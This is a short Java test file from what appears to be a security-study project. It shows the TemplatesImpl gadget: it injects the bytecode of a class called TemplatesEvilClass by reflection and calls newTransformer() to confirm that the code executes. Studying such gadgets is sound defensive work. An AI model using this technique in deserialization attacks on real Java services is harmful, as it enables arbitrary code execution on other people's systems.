import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import expUtils.ReflectUtils;

import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;

import static expUtils.ReflectUtils.getClassByte;

public class Test3 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException {
        TemplatesImpl templates = new TemplatesImpl();
        ReflectUtils.setFields(templates,"_name","9eek");
        byte[] evilCode = getClassByte("sec-common/target/classes/expUtils/TemplatesEvilClass.class");  // 将文件字节码转为byte[]
        byte[][] templatesEvilCode = new byte[][]{evilCode};
        ReflectUtils.setFields(templates,"_bytecodes",templatesEvilCode);
        ReflectUtils.setFields(templates,"_tfactory",new TransformerFactoryImpl());

        templates.newTransformer();  // 验证代码执行
    }
}
